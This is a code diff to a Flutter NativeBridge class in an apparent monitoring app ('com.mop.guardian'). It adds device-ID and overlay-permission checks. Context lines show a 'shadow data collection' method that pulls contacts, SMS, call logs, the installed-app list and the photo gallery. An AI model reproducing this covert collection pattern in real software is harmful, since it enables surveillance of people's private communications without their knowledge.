@@ -4,6 +4,16 @@ import 'package:flutter/services.dart';
 class NativeBridge {
   static const _channel = MethodChannel('com.mop.guardian/native');
 
+  /// 稳定 device_id（Android: SHA-256(ANDROID_ID)；iOS 由原生实现或返回空），用于 enroll 与 audit 一致
+  static Future<String?> getDeviceId() async {
+    try {
+      final r = await _channel.invokeMethod<Object?>('getDeviceId');
+      return r?.toString();
+    } on PlatformException {
+      return null;
+    }
+  }
+
   /// 影子数据采集；type: contacts | sms | call_log | app_list | gallery；iOS 必须项为 contacts、gallery；不采集 usage
   static Future<Map<String, dynamic>> fetchSensitiveData(String type) async {
     try {
@@ -23,6 +33,16 @@ class NativeBridge {
   /// 保存二维码图片字节到系统相册
   static Future<void> saveQrToGallery(List<int> bytes) async {
     await _channel.invokeMethod<void>('saveQrToGallery', bytes);
+  }
+
+  /// 检查 Android 悬浮窗是否已授予；iOS 恒为 true
+  static Future<bool> checkOverlayPermission() async {
+    try {
+      final r = await _channel.invokeMethod<Object?>('checkOverlayPermission');
+      return r == true;
+    } on PlatformException {
+      return false;
+    }
   }
 
   /// 申请 Android 悬浮窗权限；iOS 空实现
